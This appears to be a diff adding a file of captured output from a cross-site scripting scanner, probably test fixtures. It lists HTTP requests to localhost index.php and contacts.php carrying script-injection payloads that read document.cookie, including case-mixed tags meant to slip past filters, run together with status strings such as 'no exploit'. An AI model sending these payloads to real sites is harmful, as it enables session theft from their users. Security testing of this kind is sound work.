@@ -1,0 +1,103 @@
+
+GET /index.php?lol=<sCrIpt>alert(document.cookie);</ScRiPt> HTTP/1.1
+Host: localhost
+vector must be in sessionPOST /index.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+xsspost=<sCrIpt>alert(document.cookie);</ScRiPt>POST /index.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+xsspost=<sCrIpt>alert(document.cookie);</ScRiPt>no exploitPOST /contacts.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+lol="alert(document.cookie);vector must be in sessionPOST /contacts.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+xsspost=<sCrIpt>alert(document.cookie);</ScRiPt>POST /contacts.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+xsspost=<sCrIpt>alert(document.cookie);</ScRiPt>
+
+GET /index.php?lol="alert(document.cookie); HTTP/1.1
+Host: localhost
+
+GET /index.php?lol="alert(document.cookie); HTTP/1.1
+Host: localhost
+vector must be in session
+GET /index.php?lol="alert(document.cookie); HTTP/1.1
+Host: localhost
+vector must be in sessionGET /index.php?xsspost="alert(document.cookie); HTTP/1.1
+Host: localhost
+POST /index.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+xsspost="alert(document.cookie);
+GET /index.php?lol="alert(document.cookie); HTTP/1.1
+Host: localhost
+vector must be in sessionGET /index.php?xsspost="alert(document.cookie); HTTP/1.1
+Host: localhost
+POST /index.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+xsspost="alert(document.cookie);
+no exploitno exploit
+no exploitno exploitGET /contacts.php?lol="alert(document.cookie); HTTP/1.1
+Host: localhost
+POST /contacts.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+lol="alert(document.cookie);
+no exploitno exploitGET /contacts.php?lol="alert(document.cookie); HTTP/1.1
+Host: localhost
+POST /contacts.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+lol="alert(document.cookie);vector must be in session
+no exploitno exploitGET /contacts.php?lol="alert(document.cookie); HTTP/1.1
+Host: localhost
+POST /contacts.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+lol="alert(document.cookie);vector must be in sessionGET /contacts.php?xsspost=<sCrIpt>alert(document.cookie);</ScRiPt> HTTP/1.1
+Host: localhost
+POST /contacts.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+xsspost="alert(document.cookie);
+no exploitno exploitGET /contacts.php?lol="alert(document.cookie); HTTP/1.1
+Host: localhost
+POST /contacts.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+lol="alert(document.cookie);vector must be in sessionGET /contacts.php?xsspost=<sCrIpt>alert(document.cookie);</ScRiPt> HTTP/1.1
+Host: localhost
+POST /contacts.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+
+xsspost="alert(document.cookie);
